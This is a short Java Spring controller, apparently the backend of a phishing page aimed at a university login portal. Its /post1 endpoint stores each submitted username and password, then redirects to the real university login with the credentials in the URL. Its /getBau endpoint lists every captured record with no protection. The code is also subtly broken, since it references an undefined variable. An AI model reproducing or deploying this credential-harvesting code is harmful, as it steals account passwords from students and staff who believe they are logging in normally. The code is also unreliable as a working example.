package com.example;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.repository.CrudRepository;


/**
 * Created by baraa on 1/18/2017.
 */
interface MongoRepo extends CrudRepository <User, Long> {
		
			User findByFirstName (String name);
}

@Controller
public class BAU {


    @Autowired
    MongoRepo mongo;

    @RequestMapping("/post1")
    public String s(@RequestParam("username") String userName, @RequestParam("password") String password) {
        mongo.save(new User(username,password));
        return "redirect:http://app2.bau.edu.jo:7777/reg_new/actions/login?username=" + userName + "&password=" + password;
    }

    @RequestMapping("/getBau")
    @ResponseBody
    public  Iterable<User> list()
    {
        return mongo.findAll();
    }

    @RequestMapping("/bau")
    public String bau()
    {
        return "bau";
    }


}
